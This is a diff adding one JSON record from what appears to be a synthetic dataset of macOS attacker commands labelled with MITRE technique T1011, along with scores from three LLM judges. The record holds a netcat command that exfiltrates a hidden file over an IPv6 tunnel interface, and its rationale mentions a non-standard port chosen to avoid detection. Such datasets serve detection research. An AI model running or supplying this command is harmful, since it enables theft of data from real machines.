@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
+  "explanation": "Forces IPv6 TCP exfiltration over a secondary VPN/tunnel interface (utun4) to a link-local address on a high port, using an alternate medium per T1011.",
+  "rationale_steps": [
+    "Retrieve the utun4 IPv6 address with ipconfig to bind the source.",
+    "Send the data using TCP to a scoped link-local destination.",
+    "Use a non-standard port to reduce detection while keeping to the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-f93c25ff",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with valid nc options (-6, -s), balanced quoting, proper IPv6 literal with scope id, and correct input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly exfiltrates data over IPv6 bound to a utun interface, the reliance on a specific link-local peer address is environment-dependent and using a VPN/tunnel interface is not clearly a distinct network medium per T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T00:58:32.057967Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes and valid flags, though `ipconfig getv6ifaddr` is not a standard macOS command (the correct tool would be `ifconfig` or `networksetup`), which could cause the subshell to fail at runtime but doesn't break parsing.",
+        "semantic_score": 3,
+        "semantic_justification": "The intent to exfiltrate over an alternate network medium (utun4 VPN/tunnel interface) using IPv6 link-local addressing aligns with T1011, but `ipconfig getv6ifaddr` is not a valid macOS command (macOS uses `ifconfig` for this), and link-local addresses with zone IDs in nc may have portability issues, reducing operational plausibility.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:04:14.215929Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid macOS shell syntax, including proper command substitution with ipconfig, BSD-compatible netcat flags, and correctly formatted link-local IPv6 addresses with scope identifiers.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly targets a specific tunnel interface commonly used for VPNs or cellular modems on macOS to force data transmission over a secondary network path, perfectly aligning with the intent of T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:04:18.927202Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
